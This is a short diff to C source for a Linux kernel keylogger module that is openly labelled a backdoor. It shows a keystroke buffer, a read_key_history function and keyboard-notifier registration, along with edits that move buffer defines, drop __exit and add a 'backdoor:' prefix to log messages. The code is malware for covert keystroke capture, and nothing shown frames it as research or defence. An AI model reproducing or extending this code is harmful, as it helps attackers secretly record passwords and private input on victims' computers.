@@ -5,9 +5,6 @@
 
 #include "keylogger.h"
 
-#define BUFFER_SIZE 4096
-#define KBD_IRQ 1
-
 char buffer[BUFFER_SIZE] = { '\0' };
 int fill = 0;
 
@@ -19,7 +16,7 @@ void save_key(char key)
 
 /**
 * This needs to be freed after using
-* This needs to be checked for failing to allocate memory 
+* This needs to be checked for failing to allocate memory
 */
 char *read_key_history(void)
 {
@@ -72,22 +69,24 @@ int __init keylogger_module_init(void)
 	int result = register_keyboard_notifier(&keyboard_notifier_block);
 
 	if (result != 0) {
-		printk(KERN_ERR "Failed to register keyboard notifier\n");
+		printk(KERN_ERR
+		       "backdoor: failed to register keyboard notifier\n");
 		return result;
 	}
 
-	printk(KERN_INFO "Keylogger module initialized\n");
+	printk(KERN_INFO "backdoor: keylogger module initialized\n");
 	return 0;
 }
 
-void __exit keylogger_module_exit(void)
+void keylogger_module_exit(void)
 {
 	int result = unregister_keyboard_notifier(&keyboard_notifier_block);
 
 	if (result != 0) {
-		printk(KERN_ERR "Failed to unregister keyboard notifier: %d\n",
+		printk(KERN_ERR
+		       "backdoor: failed to unregister keyboard notifier: %d\n",
 		       result);
 	}
 
-	printk(KERN_INFO "Keylogger module exited\n");
+	printk(KERN_INFO "backdoor: keylogger module exited\n");
 }
